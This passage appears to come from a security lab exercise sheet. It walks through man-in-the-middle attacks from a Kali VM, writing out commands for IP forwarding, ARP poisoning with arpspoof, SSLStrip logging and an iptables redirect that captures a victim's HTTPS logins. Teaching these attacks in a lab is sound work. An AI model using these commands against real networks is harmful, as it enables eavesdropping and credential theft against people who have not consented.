3. Activate	routing	process	on	Kali	VM:	echo	1	>	/proc/sys/net/ipv4/ip_forward
4. Poison	 victim's	 ARP	 table	 to	 think	 that	 the	 gateway's	 MAC	 Address	 is	 the	
Attacker's	address:	arpspoof –i	eth0 –t	IP_Victima	IP_Gateway
5. Open	wireshark	and	see	victim's	traffic.
Exercise	2:

1. Become	Man	in	the	Middle	(as	in	exercise	nr.1)
2. Start	 SSLStrip	 to	 listen	 on	 port	 1234:	sslstrip –l	 1234 –s –w	 traffic.log (more	
details:	http://www.thoughtcrime.org/software/sslstrip/ )
3. Configure	IPTables	to	redirect	Traffic	over	HTTP	to	SSLStrip:	iptables	-t	nat	-A	PREROUTING	-
p	tcp --destinationport	80	-j	REDIRECT	--to-port	1234
4. In	victim's	computer	browser,	visit	and	login	to	a	HTTPS	web	server	(such	as:	Yahoo)
